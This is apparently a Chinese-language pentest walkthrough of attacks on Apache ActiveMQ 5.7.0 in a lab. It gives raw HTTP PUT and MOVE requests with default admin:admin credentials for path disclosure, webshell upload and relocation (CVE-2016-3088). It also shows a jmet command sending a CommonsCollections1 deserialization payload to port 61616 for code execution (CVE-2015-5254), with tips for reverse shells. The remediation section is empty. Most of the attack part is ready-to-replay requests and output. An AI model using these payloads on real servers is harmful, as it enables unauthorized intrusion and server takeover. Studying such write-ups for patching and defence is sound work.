@@ -1,0 +1,46 @@
+应用介绍
+Apache ActiveMQ是Apache软件基金会所研发的开放源代码消息中间件；由于ActiveMQ是一个纯Java程序，因此只需要操作系统支持Java虚拟机，ActiveMQ便可执行。ActiveMQ 是一个完全支持JMS1.1 和J2EE 1.4规范的 JMSProvider实现，尽管 JMS 规范出台已经是很久的事情了，但是JMS在当今的J2EE应用中间仍然扮演着特殊的地位。
+漏洞利用
+ActiveMQ可以多种利用方式，但是绝大部分提及都是比较单一的利用方式。
+环境：Apache ActiveMQ 5.7.0
+IP：192.168.197.25
+1、Console存在默认端口和默认密码/未授权访问(默认密码为admin:admin)
+ActiveMQ默认使用8161端口，使用nmap对目标服务器进行扫描：
+[root@localhost src]# nmap -A -p8161 192.168.197.25 \ Starting Nmap 5.51 ( http://nmap.org ) at 2017-10-26 15:31 CST Nmap scan report for 192.168.197.25 Host is up (0.00016s latency). PORT STATE SERVICE VERSION 8161/tcp open http Jetty httpd 7.6.7.v20120910 |_http-methods: No Allow or Public header in OPTIONS response (status code 401) | http-auth: HTTP/1.1 401 Unauthorized | |_basic realm=ActiveMQRealm |_http-title: Error 401 Unauthorized
+2、ActiveMQ物理路径泄漏漏洞
+ActiveMQ默认开启PUT请求，当开启PUT时，构造好Payload(即不存在的目录)，Response会返回相应的物理路径信息：
+Request Raw: PUT /fileserver/a../../%08/..%08/.%08/%08 HTTP/1.1 Host: 192.168.197.25:8161 Authorization: Basic YWRtaW46YWRtaW4= Content-Length: 4 test
+Response Raw: HTTP/1.1 500 /data/apache-activemq-5.7.0/webapps/fileserver//.././(No such file or directory) Content-Length: 0 Server: Jetty(7.6.7.v20120910)
+3、ActiveMQ PUT任意文件上传漏洞
+ActiveMQ默认开启PUT方法，当fileserver存在时我们可以上传jspwebshell。
+Request Raw: PUT /fileserver/shell.jsp HTTP/1.1 Host: 192.168.197.25:8161 User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Connection: keep-alive Upgrade-Insecure-Requests: 1 Authorization: Basic YWRtaW46YWRtaW4= Content-Length: 26 this is jsp webshell code.
+Response Raw: HTTP/1.1 204 No Content Server: Jetty(7.6.7.v20120910)
+一般构造返回204响应码即为成功，笔者测试其他环境为不可put时，返回为404或500。 put完成，我们查看service下的信息：
+[root@localhost fileserver]# pwd /data/apache-activemq-5.7.0/webapps/fileserver [root@localhost fileserver]# ls index.html META-INF shell.jsp WEB-INF [root@localhost fileserver]# cat shell.jsp this is jsp webshell code. [root@localhost fileserver]#
+4、ActiveMQ任意文件文件移动漏洞
+ActiveMQ除了支持PUT协议之外，还支持MOVE协议。
+Request Raw: MOVE /fileserver/shell.jsp HTTP/1.1 Destination:file:/data/apache-activemq-5.7.0/webapps/admin/shell.jsp Host: 192.168.197.25:8161 User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Connection: keep-alive Upgrade-Insecure-Requests: 1 Authorization: Basic YWRtaW46YWRtaW4= Content-Length: 17 Content-Length: 0
+Response Raw: HTTP/1.1 204 No Content Server: Jetty(7.6.7.v20120910)
+服务器信息如下：
+[root@localhost fileserver]# ls index.html META-INF shell.jsp WEB-INF [root@localhost fileserver]# cat shell.jsp this is jsp webshell code. [root@localhost fileserver]# ls index.html META-INF shell.jsp WEB-INF [root@localhost fileserver]# ls index.html META-INF WEB-INF [root@localhost fileserver]# cd .. [root@localhost webapps]# ls admin demo favicon.ico fileserver index.html styles [root@localhost webapps]# cd admin/ [root@localhost admin]# ls 1.jsp browse.jsp decorators index.jsp META-INF queueGraph.jsp send.jsp styles topics.jsp 404.html connection.jsp graph.jsp js network.jsp queues.jsp shell.jsp subscribers.jsp WEB-INF 500.html connections.jsp images message.jsp queueConsumers.jsp scheduled.jsp slave.jsp test xml [root@localhost admin]#
+同理，写ssh key一样，在此不再重复造轮子。
+影响版本：Apache ActiveMQ 5.x ~ 5.14.0
+CVE信息：CVE-2016-3088
+4. ActiveMQ反序列化漏洞(CVE-2015-5254)
+ActiveMQ默认对外开启61616端口，默认为ActiveMQ消息队列端口。
+其中存在一下小的细节问题：
+工具releaes的为JDK 1.7，如果自己build可无视 使用工具需要在当前目录下创建一个external目录,否则会出现NoSuchFileException
+通过构造payload,向队列发送反序列化数据到消息队列中。
+(工具下载地址：https://github.com/matthiaskaiser/jmet)
+[root@sevck_v3 ~]# java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "python /tmp/test.py" -Yp "CommonsCollections1" 192.168.197.25 61616 INFO d.c.j.t.JMSTarget [main] Connected with ID: ID:sevck_v3.0-45938-1516678757604-0:1 INFO d.c.j.t.JMSTarget [main] Sent gadget "CommonsCollections1" with command: "python /tmp/test.py" INFO d.c.j.t.JMSTarget [main] Shutting down connection ID:sevck_v3.0-45938-1516678757604-0:1
+查看消息队列触发：
+服务器监听：
+注：如果反弹不成功可能的原因是JAVA Runtime.getRuntime().exec()中不能使用管道符，需要进行一次编码
+推荐工具：http://jackson.thuraisamy.me/runtime-exec-payloads.html
+影响版本：Apache ActiveMQ 5.13.0的版本之前的存在反序列化漏洞
+CVE信息：CVE-2015-5254
+5.ActiveMQ 信息泄漏漏洞(CVE-2017-15709)
+在最新的版本中apache-activemq-5.15.0 toapache-activemq-5.15.2和apache-activemq-5.14.0to apache-activemq-5.14.5中61616默认使用了OpenWire协议，开启了debug模式，debug模式会泄漏操作系统相关信息
+影响版本：Apache ActiveMQ5.14.0 – 5.15.2
+CVE信息： CVE-2017-15709
+修复建议：
